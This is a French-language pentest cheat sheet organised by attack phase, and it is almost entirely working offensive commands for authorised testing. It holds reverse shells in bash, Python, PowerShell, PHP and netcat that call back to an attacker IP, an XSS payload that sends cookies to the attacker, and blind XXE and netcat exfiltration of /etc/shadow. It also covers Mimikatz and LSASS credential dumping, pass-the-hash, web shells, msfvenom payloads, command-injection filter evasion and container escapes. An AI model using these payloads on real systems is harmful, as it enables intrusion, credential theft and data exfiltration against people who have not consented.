# Cheat Sheet

Reference rapide des commandes et techniques couvrant l'ensemble du parcours, organisee par phase d'un engagement. Pensee pour etre cherchee au Ctrl+F en plein test.

## Reconnaissance passive

### DNS et sous-domaines

```bash
# - Transfert de zone
dig axfr domaine.tld @ns1.domaine.tld

# - Enumeration de sous-domaines
gobuster dns -d domaine.tld -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
subfinder -d domaine.tld -silent

# - Records specifiques
dig MX domaine.tld
dig TXT domaine.tld
dig ANY domaine.tld @8.8.8.8

# - Reverse DNS
dig -x <IP_CIBLE>

# - WHOIS
whois domaine.tld
```

### OSINT et fingerprinting

```bash
# - Identification des technologies
whatweb http://<IP_CIBLE>
curl -s -I http://<IP_CIBLE>

# - Certificate Transparency
curl -s "https://crt.sh/?q=%25.domaine.tld&output=json" | jq '.[].name_value' | sort -u

# - Google dorks
# site:domaine.tld filetype:pdf
# site:domaine.tld inurl:admin
# site:domaine.tld ext:sql | ext:bak | ext:conf
```

---

## Scan reseau

### Nmap

```bash
# - Decouverte d'hotes
nmap -sn 10.10.10.0/24

# - Scan rapide (top 1000 ports)
nmap -sV --open -oA scan_rapide <IP_CIBLE>

# - Scan complet
nmap -sV -sC -p- -oA scan_complet <IP_CIBLE>

# - Scan UDP (lent, cibler les ports courants)
nmap -sU --top-ports 50 <IP_CIBLE>

# - Scan agressif avec OS detection
nmap -A -T4 -p- <IP_CIBLE>

# - Scripts specifiques
nmap --script=vuln <IP_CIBLE>
nmap --script=smb-enum-shares,smb-enum-users -p 445 <IP_CIBLE>
nmap --script=http-enum -p 80,443 <IP_CIBLE>
```

| Flag | Usage |
|---|---|
| `-sV` | Detection de version |
| `-sC` | Scripts par defaut |
| `-O` | Detection d'OS |
| `-p-` | Tous les ports (65535) |
| `-sU` | Scan UDP |
| `-sS` | SYN scan (stealth) |
| `-sT` | Connect scan (via proxy) |
| `--open` | Afficher uniquement les ports ouverts |
| `-oA` | Sauvegarder en tous formats |
| `-T4` | Vitesse agressive |
| `--min-rate 1000` | Forcer le debit minimum |

---

## Enumeration de services

### FTP (21)

```bash
# - Connexion anonyme
ftp <IP_CIBLE>
# Login: anonymous / Password: (vide)

# - Lister et telecharger
ls -la
get fichier.txt
mget *.conf

# - Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP_CIBLE>
```

### SSH (22)

```bash
# - Connexion
ssh utilisateur@<IP_CIBLE>
ssh -i cle_privee utilisateur@<IP_CIBLE>

# - Brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP_CIBLE>
```

### SMTP (25)

```bash
# - Enumeration d'utilisateurs
smtp-user-enum -M VRFY -U users.txt -t <IP_CIBLE>

# - Connexion manuelle
nc -nv <IP_CIBLE> 25
HELO test
VRFY admin
```

### DNS (53)

```bash
# - Transfert de zone
dig axfr @<IP_CIBLE> domaine.tld

# - Brute force de sous-domaines
dnsenum --dnsserver <IP_CIBLE> -f subdomains.txt domaine.tld
```

### SMB (445)

```bash
# - Enumeration
crackmapexec smb <IP_CIBLE>
smbclient -L //<IP_CIBLE> -N
smbmap -H <IP_CIBLE>
enum4linux-ng <IP_CIBLE>

# - Connexion a un partage
smbclient //<IP_CIBLE>/partage -U utilisateur

# - Enumeration avec credentials
crackmapexec smb <IP_CIBLE> -u utilisateur -p motdepasse --shares
crackmapexec smb <IP_CIBLE> -u utilisateur -p motdepasse --users

# - Telecharger recursivement
smbget -R smb://<IP_CIBLE>/partage -U utilisateur
```

### SNMP (161 UDP)

```bash
# - Enumeration
snmpwalk -v2c -c public <IP_CIBLE>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP_CIBLE>

# - Brute force de community strings
hydra -P community_strings.txt <IP_CIBLE> snmp
```

### MySQL (3306)

```bash
# - Connexion
mysql -h <IP_CIBLE> -u root -p

# - Enumeration a distance
nmap --script=mysql-enum,mysql-info -p 3306 <IP_CIBLE>
```

### MSSQL (1433)

```bash
# - Connexion
impacket-mssqlclient utilisateur@<IP_CIBLE> -windows-auth

# - Execution de commandes (si xp_cmdshell actif)
# SQL> EXEC xp_cmdshell 'whoami';

# - Activer xp_cmdshell
# SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
# SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### RDP (3389)

```bash
# - Connexion
xfreerdp /v:<IP_CIBLE> /u:utilisateur /p:motdepasse /cert:ignore /dynamic-resolution

# - Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://<IP_CIBLE>
```

### WinRM (5985)

```bash
# - Connexion
evil-winrm -i <IP_CIBLE> -u utilisateur -p motdepasse

# - Avec hash NTLM
evil-winrm -i <IP_CIBLE> -u utilisateur -H <HASH_NTLM>
```

### NFS (2049)

```bash
# - Lister les partages disponibles
showmount -e <IP_CIBLE>
nmap --script=nfs-ls,nfs-showmount -p 111,2049 <IP_CIBLE>

# - Monter un partage
mkdir /tmp/nfs && mount -t nfs <IP_CIBLE>:/partage /tmp/nfs

# - Verifier no_root_squash (partage monte avec uid 0)
cat /etc/exports   # sur la cible si acces ; chercher no_root_squash
```

### IMAP / POP3 (143 / 110)

```bash
# - Connexion IMAP manuelle
nc -nv <IP_CIBLE> 143
a LOGIN utilisateur motdepasse
a LIST "" *
a SELECT INBOX
a FETCH 1 all

# - Connexion POP3 manuelle
nc -nv <IP_CIBLE> 110
USER utilisateur
PASS motdepasse
LIST
RETR 1

# - Avec curl
curl -k "imaps://<IP_CIBLE>" --user utilisateur:motdepasse
curl -k "imaps://<IP_CIBLE>/INBOX;MAILINDEX=1" --user utilisateur:motdepasse
```

### IPMI (623 UDP)

```bash
# - Detection
nmap -sU -p 623 <IP_CIBLE>

# - Enumeration avec ipmitool
ipmitool -I lanplus -H <IP_CIBLE> -U admin -P admin user list

# - Extraction des hashes IPMI 2.0 (zero-auth bypass)
use auxiliary/scanner/ipmi/ipmi_dumphashes   # Metasploit
# Hashes hashcat mode 7300 (IPMI2 RAKP HMAC-SHA1)
hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt
```

### Oracle TNS (1521)

```bash
# - Enumeration
nmap --script=oracle-tns-version -p 1521 <IP_CIBLE>
tnscmd10g version -h <IP_CIBLE>

# - Brute force SID
nmap --script=oracle-sid-brute -p 1521 <IP_CIBLE>

# - Connexion (impacket)
mssqlclient.py utilisateur/motdepasse@<IP_CIBLE>:1521

# - Connexion avec odat
odat all -s <IP_CIBLE> -p 1521
```

---

## Enumeration web

### Fuzzing de repertoires

```bash
# - GoBuster
gobuster dir -u http://<IP_CIBLE> \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -t 50

# - ffuf
ffuf -u http://<IP_CIBLE>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.html,.txt -t 50

# - Filtrage ffuf (exclure par taille, code, mots)
ffuf -u http://<IP_CIBLE>/FUZZ -w wordlist.txt -fs 0
ffuf -u http://<IP_CIBLE>/FUZZ -w wordlist.txt -fc 403,404
ffuf -u http://<IP_CIBLE>/FUZZ -w wordlist.txt -fw 12
```

### Virtual hosts

```bash
# - Enumeration de vhosts
gobuster vhost -u http://domaine.tld \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# - ffuf (filtrer par taille de reponse par defaut)
ffuf -u http://domaine.tld -H "Host: FUZZ.domaine.tld" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <TAILLE_PAR_DEFAUT>
```

### Fuzzing de parametres

```bash
# - Decouvrir des parametres GET
ffuf -u http://<IP_CIBLE>/page?FUZZ=test \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

# - Decouvrir des parametres POST
ffuf -u http://<IP_CIBLE>/page -X POST \
  -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

# - Fuzzer des valeurs
ffuf -u http://<IP_CIBLE>/page?id=FUZZ -w <(seq 1 1000) -fs 0
```

### CMS

```bash
# - WordPress
wpscan --url http://<IP_CIBLE> --enumerate u,p,t
wpscan --url http://<IP_CIBLE> -U admin -P /usr/share/wordlists/rockyou.txt

# - Drupal
droopescan scan drupal -u http://<IP_CIBLE>

# - Joomla
joomscan -u http://<IP_CIBLE>
```

---

## Exploitation web

### Injection SQL

{% tabs %}
{% tab title="Manuelle" %}
```
# - Detection
' OR 1=1-- -
' OR 1=1#
" OR 1=1-- -

# - Nombre de colonnes (ORDER BY)
' ORDER BY 1-- -
' ORDER BY 2-- -
# ... incrementer jusqu'a l'erreur

# - UNION SELECT
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -

# - Enumeration des bases
' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -

# - Enumeration des tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='db'-- -

# - Enumeration des colonnes
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

# - Extraction
' UNION SELECT username,password FROM users-- -

# - Lecture de fichiers (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -

# - Ecriture de fichier (MySQL, si FILE priv)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```
{% endtab %}
{% tab title="SQLMap" %}
```bash
# - Detection automatique
sqlmap -u "http://<IP_CIBLE>/page?id=1" --batch

# - Depuis une requete Burp
sqlmap -r request.txt --batch

# - Enumeration
sqlmap -u "http://<IP_CIBLE>/page?id=1" --dbs
sqlmap -u "http://<IP_CIBLE>/page?id=1" -D db --tables
sqlmap -u "http://<IP_CIBLE>/page?id=1" -D db -T users --dump

# - Shell OS
sqlmap -u "http://<IP_CIBLE>/page?id=1" --os-shell

# - Bypass WAF
sqlmap -u "http://<IP_CIBLE>/page?id=1" --tamper=space2comment --random-agent

# - Forcer la technique
sqlmap -u "http://<IP_CIBLE>/page?id=1" --technique=U  # Union
sqlmap -u "http://<IP_CIBLE>/page?id=1" --technique=B  # Boolean blind
sqlmap -u "http://<IP_CIBLE>/page?id=1" --technique=T  # Time blind
```
{% endtab %}
{% endtabs %}

### XSS

```javascript
// - Detection
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// - Vol de cookies
<script>new Image().src="http://<IP_ATTAQUANT>/?c="+document.cookie</script>

// - Contournements courants
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Inclusion de fichiers (LFI)

```
# - LFI basique
http://<IP_CIBLE>/page?file=../../../../etc/passwd

# - Wrappers PHP
http://<IP_CIBLE>/page?file=php://filter/convert.base64-encode/resource=index.php
http://<IP_CIBLE>/page?file=php://input  (POST: <?php system('id'); ?>)
http://<IP_CIBLE>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=

# - Log poisoning
# 1. Injecter du PHP dans le User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP_CIBLE>
# 2. Inclure le log
http://<IP_CIBLE>/page?file=/var/log/apache2/access.log&cmd=id

# - Contournements
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd%00  (PHP < 5.3)
```

### Upload de fichiers

```bash
# - Web shell PHP minimal
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# - Contournements d'extension
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.phtml
shell.php5

# - Contournement de Content-Type
# Changer Content-Type: application/x-php → image/jpeg

# - Contournement de magic bytes
# Ajouter GIF89a; en debut de fichier PHP
printf 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

### Injection de commandes

```
# - Operateurs de chaining
; id
| id
|| id
& id
&& id
$(id)
`id`

# - Contournements d'espaces
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat$IFS$9/etc/passwd
cat%09/etc/passwd

# - Contournement de filtres sur les mots
c'a't /etc/passwd
c\at /etc/passwd
${PATH:0:1}  # = /
who$(printf "\x61")mi  # = whoami

# - Newline injection
%0aid
```

#### Obfuscation avancée (Linux)

```bash
# - Extraction de caracteres depuis les variables d'environnement
${PATH:0:1}          # = /  (premier char de $PATH)
${LS_COLORS:10:1}    # = ;  (position variable selon le systeme)

# - Decalage ASCII (character shifting)
echo $(tr '!-}' '"-~'<<<[)   # = \  (decale [ de +1 en ASCII)

# - Manipulation de casse (contourner blacklist exacte)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")     # = whoami
$(a="WhOaMi";printf%09%s%09"${a,,}")  # variante bash 4+

# - Inversion de commande
echo 'whoami' | rev          # -> imaohw
$(rev<<<'imaohw')            # execute whoami

# - Encodage base64
echo -n 'cat /etc/passwd' | base64   # -> Y2F0IC9ldGMvcGFzc3dk
bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)

# - Encodage hexadecimal avec xxd (si base64 est bloque)
echo -n 'whoami' | xxd -p             # -> 77686f616d69
bash<<<$(xxd -r -p<<<77686f616d69)   # execute whoami

# - Payload complet (newline + IFS + extraction slash)
127.0.0.1%0ac'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

#### Obfuscation avancée (Windows)

```cmd
:: - Extraction depuis %HOMEPATH% (\Users\...) -> \
echo %HOMEPATH:~0,1%

:: - PowerShell : premier caractere de HOMEPATH
$env:HOMEPATH[0]

:: - Manipulation de casse (insensible natif CMD/PS)
WhOaMi
```

| Technique | Linux | Windows |
|---|---|---|
| Extraire `/` | `${PATH:0:1}` | `%HOMEPATH:~0,1%` |
| Extraire `;` | `${LS_COLORS:10:1}` | N/A (utiliser `%0a` ou `&`) |
| Decalage ASCII | `$(tr '!-}' '"-~'<<<[)` | N/A |
| Casse | `$(tr "[A-Z]" "[a-z]"<<<"CMD")` | Natif (insensible) |
| Inversion | `$(rev<<<'dmc')` | `iex "$('imaohw'[-1..-20] -join '')"` |
| Base64 | `bash<<<$(base64 -d<<<PAYLOAD)` | `iex "$([...FromBase64String('PAYLOAD')])"` |
| Hex (xxd) | `bash<<<$(xxd -r -p<<<HEXVAL)` | N/A |

### RFI (Remote File Inclusion)

```bash
# - Verifier allow_url_include
# Via LFI : ?file=php://filter/convert.base64-encode/resource=/etc/php.ini
# Decoder : echo "BASE64" | base64 -d | grep allow_url_include

# - RCE via HTTP (si allow_url_include=On)
# Creer le shell sur votre machine :
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8080
# Inclusion :
http://<IP_CIBLE>/page?file=http://<IP_ATTAQUANT>:8080/shell.php&cmd=id

# - RCE via FTP
python3 -m pyftpdlib -p 21
http://<IP_CIBLE>/page?file=ftp://<IP_ATTAQUANT>/shell.php&cmd=id

# - RCE via SMB (Windows)
impacket-smbserver partage . -smb2support
http://<IP_CIBLE>/page?file=\\<IP_ATTAQUANT>\partage\shell.php&cmd=whoami
```

### IDOR

```bash
# - Enumeration de masse sur un parametre numerique
for i in $(seq 1 100); do
  curl -s "http://<IP_CIBLE>/api/user?uid=$i" | jq '.username'
done

# - Enumeration avec ffuf
ffuf -u "http://<IP_CIBLE>/api/user?uid=FUZZ" \
  -w <(seq 1 500) -fs <TAILLE_REPONSE_VIDE>

# - Contournement d'ID hash (recalculer le hash)
echo -n "uid=2" | md5sum
# Remplacer le hash dans la requete Burp

# - IDOR sur API REST
# GET /api/v1/profile/2  -> modifier l'ID dans Repeater
# POST /api/v1/message   -> modifier uid dans le body JSON
```

### HTTP Verb Tampering

```bash
# - Tester les verbes autorises
curl -s -X OPTIONS http://<IP_CIBLE>/admin/ -i | grep Allow

# - Bypass d'authentification avec GET -> HEAD/POST/PUT
curl -s -X HEAD http://<IP_CIBLE>/admin/
curl -s -X PUT http://<IP_CIBLE>/admin/page

# - Bypass de filtre de securite (le filtre ne couvre que POST)
curl -s -X GET "http://<IP_CIBLE>/page?cmd=id"
curl -s -X PATCH "http://<IP_CIBLE>/page" -d "param=valeur"
```

### XXE

```xml
<!-- - Lecture de fichier -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- - SSRF -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- - Out-of-band (blind) via DTD externe -->
<!-- evil.dtd sur votre serveur : -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<IP_ATTAQUANT>/?d=%file;'>">
%eval;
%exfil;
<!-- Payload dans la requete : -->
<!ENTITY % dtd SYSTEM "http://<IP_ATTAQUANT>/evil.dtd">
%dtd;

<!-- - XXE via SVG upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

---

## Brute force et cassage

### Hydra

```bash
# - SSH
hydra -l utilisateur -P wordlist.txt ssh://<IP_CIBLE>

# - FTP
hydra -l utilisateur -P wordlist.txt ftp://<IP_CIBLE>

# - HTTP POST form
hydra -l admin -P wordlist.txt <IP_CIBLE> http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# - HTTP Basic Auth
hydra -l admin -P wordlist.txt <IP_CIBLE> http-get /admin

# - RDP
hydra -l admin -P wordlist.txt rdp://<IP_CIBLE>

# - Limiter la vitesse (eviter les lockouts)
hydra -l admin -P wordlist.txt ssh://<IP_CIBLE> -t 4 -W 5
```

### Hashcat

| Mode | Type de hash |
|---|---|
| `0` | MD5 |
| `100` | SHA1 |
| `1400` | SHA256 |
| `1000` | NTLM |
| `3000` | LM |
| `1800` | SHA-512 (Unix) |
| `500` | MD5 (Unix) |
| `5600` | NetNTLMv2 |
| `13100` | Kerberoasting (TGS-REP) |
| `18200` | AS-REP Roasting |
| `22000` | WPA-PBKDF2-PMKID+EAPOL |

```bash
# - Dictionnaire
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt

# - Avec regles
hashcat -m <MODE> hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# - Brute force masque
hashcat -m <MODE> hash.txt -a 3 ?u?l?l?l?d?d?d?d
# ?l=minuscule ?u=majuscule ?d=chiffre ?s=special ?a=tout
```

### John the Ripper

```bash
# - Format automatique
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# - Extraction de hash depuis un fichier
ssh2john id_rsa > id_rsa.hash
zip2john archive.zip > zip.hash
keepass2john database.kdbx > keepass.hash
pdf2john fichier.pdf > pdf.hash
office2john document.docx > office.hash

# - Afficher les mots de passe craques
john --show hash.txt
```

---

## Password attacks

### Extraction de credentials (Linux)

```bash
# - Hashs depuis /etc/shadow
sudo cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# - Recherche de credentials dans les fichiers
grep -rn "password\|passwd\|pwd\|secret\|key" /etc/ 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password"
cat ~/.bash_history | grep -i "pass\|user\|-p "

# - Cles privees SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
```

### Extraction de credentials (Windows)

```powershell
# - SAM via registry (necessite SYSTEM)
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
# Sur la machine d'attaque :
secretsdump.py LOCAL -sam sam -system system -outputfile hashes

# - SAM via VSS (shadow copy)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\sam C:\Temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\system C:\Temp\system

# - LSASS dump (necessite SeDebugPrivilege)
# Via Task Manager : clic droit LSASS -> creer un fichier de vidage
# Via rundll32 :
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID_LSASS> C:\Temp\lsass.dmp full
# Sur la machine d'attaque :
pypykatz lsa minidump lsass.dmp

# - Mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords    # credentials en memoire
sekurlsa::wdigest           # mots de passe en clair (si WDigest actif)
lsadump::sam                # hashes SAM
lsadump::lsa /patch         # hashes LSA
lsadump::dcsync /user:krbtgt /domain:DOMAINE.LOCAL  # DCSync

# - NTDS.dit (Domain Controller)
# Via ntdsutil :
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
# Sur la machine d'attaque :
secretsdump.py LOCAL -ntds C:\Temp\ntds\Active\ Directory\ntds.dit -system C:\Temp\ntds\registry\SYSTEM

# - Recherche de credentials
cmdkey /list                                              # credentials sauvegardes
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s              # community strings
dir C:\Users\ /s /b *.txt *.ini *.config 2>nul | findstr /i "pass"
```

### Pass-the-Hash / Pass-the-Ticket

```bash
# - Pass-the-Hash (format LMHASH:NTHASH ou :NTHASH)
crackmapexec smb <IP_CIBLE> -u admin -H <HASH_NTLM>
psexec.py DOMAINE/admin@<IP_CIBLE> -hashes :<HASH_NTLM>
evil-winrm -i <IP_CIBLE> -u admin -H <HASH_NTLM>
xfreerdp /v:<IP_CIBLE> /u:admin /pth:<HASH_NTLM> /cert:ignore

# - Overpass-the-Hash (hash -> ticket Kerberos)
.\mimikatz.exe "sekurlsa::pth /user:admin /domain:DOMAINE /ntlm:<HASH>"

# - Pass-the-Ticket
# Exporter le ticket :
.\mimikatz.exe "sekurlsa::tickets /export"
# Importer le ticket :
.\mimikatz.exe "kerberos::ptt ticket.kirbi"
# Ou via impacket :
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass DOMAINE/utilisateur@hote.domaine.local
```

### Generation de wordlists personnalisees

```bash
# - CeWL (depuis un site web)
cewl http://<IP_CIBLE> -d 3 -m 6 -w wordlist.txt

# - CUPP (profil utilisateur)
python3 cupp.py -i   # interactif

# - Mutagen (regles hashcat)
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > mutated.txt

# - Username wordlist depuis nom/prenom
cat noms.txt | while read nom; do
  echo "${nom:0:1}$(echo $nom | cut -d' ' -f2)"    # jdoe
  echo "$(echo $nom | cut -d' ' -f2).$(echo $nom | cut -d' ' -f1)"  # doe.john
done
```

---

## Shells

### Reverse shells

{% tabs %}
{% tab title="Bash" %}
```bash
bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1'
```
{% endtab %}
{% tab title="Python" %}
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<IP_ATTAQUANT>",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```
{% endtab %}
{% tab title="PowerShell" %}
```powershell
$c=New-Object Net.Sockets.TCPClient('<IP_ATTAQUANT>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}
```
{% endtab %}
{% tab title="PHP" %}
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1'"); ?>
```
{% endtab %}
{% tab title="Netcat" %}
```bash
# - Avec -e
nc -e /bin/bash <IP_ATTAQUANT> 4444

# - Sans -e (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP_ATTAQUANT> 4444 >/tmp/f
```
{% endtab %}
{% endtabs %}

### Listener et stabilisation

```bash
# - Listener
nc -nlvp 4444
rlwrap nc -nlvp 4444  # meilleur historique

# - Stabilisation
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 120
```

### Web shells

```bash
# - PHP
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
# Usage: http://<IP_CIBLE>/cmd.php?cmd=id

# - JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# - ASP
<% eval request("cmd") %>
```

### msfvenom

```bash
# - Lister les payloads
msfvenom -l payloads | grep "linux/x64\|windows/x64"

# - ELF Linux stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f elf -o shell.elf

# - EXE Windows stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f exe -o shell.exe

# - EXE Windows staged (Meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f exe -o meter.exe

# - WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f war -o shell.war

# - PHP webshell
msfvenom -p php/reverse_php LHOST=<IP_ATTAQUANT> LPORT=4444 -f raw -o shell.php

# - Encodage basique (pas suffisant contre AV modernes)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o shell_enc.exe

# - Listener multi/handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_ATTAQUANT>
set LPORT 4444
exploit -j
```

---

## Transfert de fichiers

{% tabs %}
{% tab title="Vers la cible (Linux)" %}
```bash
# - HTTP (depuis la machine d'attaque)
python3 -m http.server 8080
# Sur la cible :
wget http://<IP_ATTAQUANT>:8080/fichier
curl http://<IP_ATTAQUANT>:8080/fichier -o fichier

# - SCP
scp fichier utilisateur@<IP_CIBLE>:/tmp/

# - Base64
base64 fichier | tr -d '\n'
# Sur la cible :
echo "<BASE64>" | base64 -d > fichier

# - Netcat
# Attaquant :
nc -nlvp 9999 < fichier
# Cible :
nc <IP_ATTAQUANT> 9999 > fichier
```
{% endtab %}
{% tab title="Vers la cible (Windows)" %}
```powershell
# - PowerShell
Invoke-WebRequest http://<IP_ATTAQUANT>:8080/fichier -OutFile C:\Temp\fichier
(New-Object Net.WebClient).DownloadFile('http://<IP_ATTAQUANT>:8080/fichier','C:\Temp\fichier')
iwr http://<IP_ATTAQUANT>:8080/fichier -o C:\Temp\fichier

# - Certutil
certutil -urlcache -split -f http://<IP_ATTAQUANT>:8080/fichier C:\Temp\fichier

# - SMB (depuis l'attaquant)
impacket-smbserver partage . -smb2support
# Sur la cible :
copy \\<IP_ATTAQUANT>\partage\fichier C:\Temp\fichier
```
{% endtab %}
{% tab title="Exfiltration" %}
```bash
# - Upload HTTP (serveur Python)
python3 -c "
import http.server, cgi
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
        f = form['file']
        open(f.filename,'wb').write(f.file.read())
        self.send_response(200)
        self.end_headers()
http.server.HTTPServer(('0.0.0.0',8080),H).serve_forever()
"

# - Netcat
# Attaquant (recevoir) :
nc -nlvp 9999 > exfil.txt
# Cible (envoyer) :
nc <IP_ATTAQUANT> 9999 < /etc/shadow
```
{% endtab %}
{% endtabs %}

---

## Escalade de privileges

### Linux

```bash
# - Enumeration rapide
id
sudo -l
find / -perm -4000 2>/dev/null          # SUID
find / -perm -2000 2>/dev/null          # SGID
getcap -r / 2>/dev/null                 # Capabilities
cat /etc/crontab; ls -la /etc/cron*     # Cron jobs
ls -la /etc/passwd /etc/shadow          # Permissions
env                                      # Variables d'environnement
ps auxww                                # Processus
cat /etc/exports                        # NFS no_root_squash

# - Outils automatises
./linpeas.sh | tee linpeas.txt
./pspy64                                # Surveiller les processus sans root
```

#### LD_PRELOAD (sudo env_keep)

```bash
# /tmp/priv.c :
# #include <stdio.h>
# #include <sys/types.h>
# #include <stdlib.h>
# void _init() { unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash"); }
gcc -fPIC -shared -nostartfiles -o /tmp/priv.so /tmp/priv.c
sudo LD_PRELOAD=/tmp/priv.so <binaire_autorise>
```

#### NFS no_root_squash

```bash
# Sur votre machine d'attaque (root requis) :
showmount -e <IP_CIBLE>
mkdir /tmp/nfs && mount -t nfs <IP_CIBLE>:/partage /tmp/nfs
# Copier bash et lui mettre le SUID :
cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash
# Sur la cible :
/tmp/partage/bash -p   # shell root
```

#### Docker breakout

```bash
# Si dans le groupe docker :
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Si dans un conteneur avec --privileged :
fdisk -l                         # reperer le disque hote
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host                 # shell sur l'hote
```

#### LXD breakout

```bash
# Sur la machine d'attaque : construire l'image Alpine
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine && python3 -m http.server 8080
# Sur la cible :
wget http://<IP_ATTAQUANT>:8080/alpine-v3.xx-x86_64.tar.gz
lxc image import alpine-*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer host-root disk source=/ path=/r recursive=true
lxc start mycontainer && lxc exec mycontainer /bin/sh
# Dans le conteneur :
ls /r/root/
